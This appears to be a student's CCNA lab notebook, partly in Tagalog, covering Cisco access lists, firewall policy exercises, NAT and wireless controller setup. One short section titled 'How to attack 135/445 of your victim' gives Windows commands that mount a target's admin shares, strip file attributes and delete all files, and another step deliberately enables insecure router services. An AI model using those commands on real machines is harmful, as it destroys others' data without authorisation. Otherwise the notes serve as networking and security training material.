DAY 4 

Ping 10.md.100.8
ping 10.m.m.1
ping 200.0.0.m
ping 200.0.0.k
ping 10.k.1.10

@Task1: Basic Cisco Security
Standard Access-list: Block IP Address only


0.0.0.0 0.0.0.0.0
10.41.1.10

@EDGE
Config T
no access-list 1
access-list 1 permit 10.21.0.0 0.0.255.255
access-list 1 permit 10.31.0.0 0.0.255.255
access-list 1 permit 10.41.0.0 0.0.255.255
access-list 1 permit 10.51.0.0 0.0.255.255
int gi 0/0/1
    ip access-group 1 in 
    do sh access-list 1


tempo: 
int gi 0/0/1
    no ip access-group 1 in
    do sh access-list 1

Config T
no access-list 2
access-list 2 permit 10.11.0.0 0.0.255.255
access-list 2 permit 10.21.0.0 0.0.255.255
access-list 2 permit 10.31.0.0 0.0.255.255
access-list 2 permit 10.41.0.0 0.0.255.255
access-list 2 permit 10.51.0.0 0.0.255.255
int gi 0/0/1
    ip access-group 2 in 
    do sh access-list 2


7 OSI Layer
Physical bigyan ng kuryente ang mga devices thru protocol of Power over Ethernet (802.3ae) 48v 54v
    Volts = Boltahe
    Interface = Interface itself (eg RJ45)
    Transmission = Fiber 85/315
                 = RF
                 = 85 

How to attack 135/445 of your victim: 
cmd

net use \\10.k.1.10\ipc$ /user:administrator

net use x: \\10.k.1.10\c$ 

x:dir /ah (show the hidden files)
    attrib -s -r -h *.*
    del *.*
MKDIR pumasoksi____


@Task2: CONFIGURING BASIC CISCO FIREWALL
Step 1: Make cucm VERY HACKABLE: 

PC: nmap -v 10.41.100.8

@cucm
Config T
service tcp-small-servers
service udp-small-servers
service finger
ip dns servers
ip http server
ip http secure-server
int fa 0/0
    ip add 10.41.100.9 255.255.255.0 Secondary
    end 


@cucm
ip host cm 10.41.100.8
ip host cm2 10.41.100.9
ip host pc 10.41.1.4
ip host sw 10.41.100.4
ip host p1 10.41.100.101
ip host p2 10.41.100.102

CyberSecurity
UTM = Unified Threat Management
    FIREWALL
    VPNsite2site
    AntiVirus
    IntrusionDectionSystem/Prevention: ips/ids: SnORT
    NAC: Network Admission Control

@Task5: MAKE A FIREWALL POLICY TO MEET THESE CONDITION 
Conditions: 1
cm is a company website,protectIT: 80,443,2000
cm2 is a DNS and ssh server.protectIT: 53,22
extended Name access-list:

@cucm: PROTOCOL > tcp,udp,IP,icmp
       HACKER > victim port 

HTTPS: 443
HTTP: 80
DNS: 53
SSH: 22


conf t 
no IP access-list extended FP1
IP access-list extended FP1
    permit tcp Any host cm EQ 80 log
    permit tcp Any host cm EQ 443 log
    permit tcp Any host cm EQ 2000 log
    permit tcp Any host cm2 EQ 53 log
    permit tcp Any host cm2 EQ 22 log
int fa 0/0
 ip access-group FP1 in
 do sh access-list FP1 

Conditions: 2
cm is a company website,protectIT: 80,443,5060
cm2 is a DNS and ssh server.protectIT: 53,22
extended Name access-list:

no IP access-list extended FP1
IP access-list extended FP1
    permit tcp Any host cm EQ 80 log
    permit tcp Any host cm EQ 443 log
    permit tcp Any host cm EQ 5060 log
    permit tcp Any host cm2 EQ 53 log
    permit tcp Any host cm2 EQ 22 log
int fa 0/0
 ip access-group FP1 in
 do sh access-list FP1 


 Ex2: Make a FirewallPolicy to these:
 cm is a http, ssh and dns server only
 cm2 is a https server, telnet server 

HTTP: 80
ssh: 22
DNS: 53
https: 443



conf t 
no IP access-list extended FP2
IP access-list extended FP2 
    permit tcp Any host cm EQ 80 log
    permit tcp Any host cm EQ 22 log
    permit tcp Any host cm EQ 53 log
    permit tcp Any host cm2 EQ 443 log
    permit tcp Any host cm2 EQ 23 log
    permit tcp Any host cm2 EQ 22 log
int fa 0/0
 ip access-group FP2 in
 do sh access-list FP2


 Ex3: You have been fire (remove the firewall)

 conf t 
 int fa 0/0
    no ip access-group FP2 in


Ex4: Create FP3 to allow 
cm  allow finger,daytime,sccp,sip
cm2 allow ssh,telnet,dns,ping(icmp)

conf T
no IP access-list extended FP3
IP access-list extended FP3
    permit tcp Any host cm EQ 79 log
    permit tcp Any host cm EQ 13 log
    permit tcp Any host cm EQ 2000 log
    permit tcp Any host cm EQ 5060 log
    permit tcp Any host cm2 EQ 22 log
    permit tcp Any host cm2 EQ 23 log
    permit tcp Any host cm2 EQ 53 log 
    permit icmp any host cm2 log 
int fa 0/0
ip access-group FP3 in
do sh access-list FP3 


Ex5: Create no lamon policy to meet this Condition

cm allow ping, sip, web, secureweb(hhtps)
cm2 allow ssh, telnet, dns ,sccp, finger 

conf T
no IP access-list extended NOLAMON
IP access-list extended NOLAMON
    permit icmp Any host cm log 
    permit tcp Any host cm 5060 log
    permit tcp any host cm 80 log
    permit tcp any host cm 443 log 
    permit tcp any host cm2 22 log
    permit tcp any host cm2 23 log
    permit tcp any host cm2 53 log
    permit tcp any host cm2 2000 log 
int fa 0/0 
ip access-group NOLAMON in
do sh access-list NOLAMON


int fa 0/0
    no ip access-group BREAKTIME in
    do sh access-list BREAKTIME


Task6: 4th and FINAL in CCNA EXAM
Network Address Translation.

@EDGE
sh run int gi 0/0/1

@NAT = network address Translation
M.S = proxy
Apple = Hotspot 
Android = tethering 

@EDGE
config T
access-list 8 permit 10.41.0.0 0.0.255.255
int gi 0/0/0
ip Nat Inside 
int gi 0/0/1
ip Nat Outside
ip Nat Inside source list 8 int gi 0/0/1 Overload
ip Nat inside source static 10.41.1.10 200.0.0.141 
ip Nat Inside source static tcp 10.41.1.0 80 200.0.0.141 8080


@
do sh ip nat Translation


KILLNAT 
@PC stop ping 
@EDGE clear ip nat translation *

config t
int gi 0/0/0
    no ip nat inside
int gi 0/0/1
    no ip nat Outside

PC: ping 10.k.1.10 -t

TASK7: 15% EXAM. Entering the World of DevOps 

Network Engr vs DevOps

Enterprise Wireless Deployment: 

Wireless Controler & Wireless Access Point 

@sw
en
clear ip dhcp binding *

a username will show open OPERA MINi type: https://ip 

username: admin
pw: C1sc0123
confirm pw: C1sc0123

System name: Controll-m (41)
Country: PH 
Date&time: As is 
Timezone: As is 

Management IP add: 10.41.10.41
Subnet mask: 255.255.255.0
Default Gateway: 10.41.10.4

*next* 

"Employee Network"
Network name: M-WifiKarl
Pass: C1sc0123

*next*

Network Security Fundamentals:

Securit Concepts and Terminologies

Assets:
Hardwares - 
People  - customer information  
Data  - sensitive information 

